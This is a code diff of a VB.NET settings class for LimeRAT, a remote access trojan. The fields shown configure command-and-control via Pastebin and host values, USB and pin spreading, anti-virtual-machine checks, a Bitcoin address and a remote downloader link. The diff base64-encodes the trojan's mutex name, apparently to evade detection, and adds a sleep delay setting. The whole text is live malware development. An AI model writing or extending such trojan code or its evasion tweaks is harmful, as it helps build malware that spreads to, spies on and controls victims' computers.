@@ -13,7 +13,7 @@
         Public Shared SPL As String = "|'L'|" 'split bytes
         Public Shared EXE As String = "CLIENT.exe" 'client name
         Public Shared NMT As Threading.Mutex = Nothing ' mutex
-        Public Shared MTX As String = "_LimeRAT_" 'mutex
+        Public Shared MTX As String = "I0xpbWVSQVQ=" 'mutex
         Public Shared USB As Boolean = False 'usb spread
         Public Shared PIN As Boolean = False 'pin spread
         Public Shared ANTI As Boolean = False 'anti virtual machines
@@ -24,6 +24,8 @@
         Public Shared BTC_ADDR As String = "THIS IS YOUR BTC 1234567890" 'Bitcoin address
         Public Shared DWN_CHK As Boolean = True 'downloader once
         Public Shared DWN_LINK As String = "" 'downloader link
+        Public Shared Delay As Integer = "1" 'Delay AKA Sleep
+
 #Else
     Public Shared Pastebin As String = "%Pastebin%"
     Public Shared HOST As String
@@ -33,7 +35,7 @@
     Public Shared SPL As String = "%SPL%"
     Public Shared EXE As String = "%EXE%"
     Public Shared NMT As Threading.Mutex = Nothing
-    Public Shared MTX As String = "_LimeRAT_"
+    Public Shared MTX As String = "I0xpbWVSQVQ="
     Public Shared USB As Boolean = "%USB%"
     Public Shared PIN As Boolean = "%PIN%"
     Public Shared ANTI As Boolean = "%ANTI%"
@@ -43,7 +45,8 @@
     Public Shared fullpath = Environ(PATH1) & "\" & PATH2 & "\" & EXE
     Public Shared BTC_ADDR As String = "%BTC_ADDR%"
     Public Shared DWN_CHK As Boolean = "%DWN_CHK%"
-    Public Shared DWN_LINK As String = "%DWN_LINK%"
+        Public Shared DWN_LINK As String = "%DWN_LINK%"
+        Public Shared Delay As Integer = "%Delay%"
 #End If
 
     End Class
